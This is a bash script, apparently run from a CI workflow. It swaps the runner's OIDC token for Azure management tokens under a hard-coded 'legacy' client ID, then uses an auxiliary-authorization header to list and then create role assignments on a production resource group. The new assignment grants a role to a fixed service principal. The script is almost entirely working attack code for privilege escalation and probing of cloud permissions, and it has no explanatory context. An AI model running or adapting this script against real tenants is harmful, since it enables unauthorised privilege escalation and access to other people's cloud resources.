#!/usr/bin/env bash
set +e
T="$AZURE_TENANT_ID"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)
echo "oidc=${#OIDC}"
tok(){ curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id="$1" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion="$OIDC" --data-urlencode scope="$2"; }
LARM=$(tok 891fb158-e02c-4428-a885-53b811f369c0 https://management.azure.com/.default)
LPLAT=$(tok 891fb158-e02c-4428-a885-53b811f369c0 462d1c38-4459-48b8-9333-82e389e59514/.default)
LA=$(echo "$LARM"|jq -r .access_token); LP=$(echo "$LPLAT"|jq -r .access_token)
echo "legacy_arm=$(echo "$LARM"|jq -r '.error // ("ok:"+(.access_token|length|tostring))')"
echo "platform=$(echo "$LPLAT"|jq -r '.error // ("ok:"+(.access_token|length|tostring))')"
URL="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
echo '===aux===;'
curl -sS -w '\nstatus=%{http_code}\n' -X GET "$URL" -H "Authorization: Bearer $LA" -H "x-ms-authorization-auxiliary: Bearer $LP" | head -c 3000
echo '===aux-write===;'
RID=$(cat /proc/sys/kernel/random/uuid)
curl -sS -w '\nstatus=%{http_code}\n' -X PUT "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Authorization/roleAssignments/$RID?api-version=2022-04-01" -H "Authorization: Bearer $LA" -H "x-ms-authorization-auxiliary: Bearer $LP" -H 'content-type: application/json' --data '{"properties":{"roleDefinitionId":"/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":"f64d08c7-fde6-4553-99c8-5bf73666ee8c","principalType":"ServicePrincipal"}}' | head -c 3000
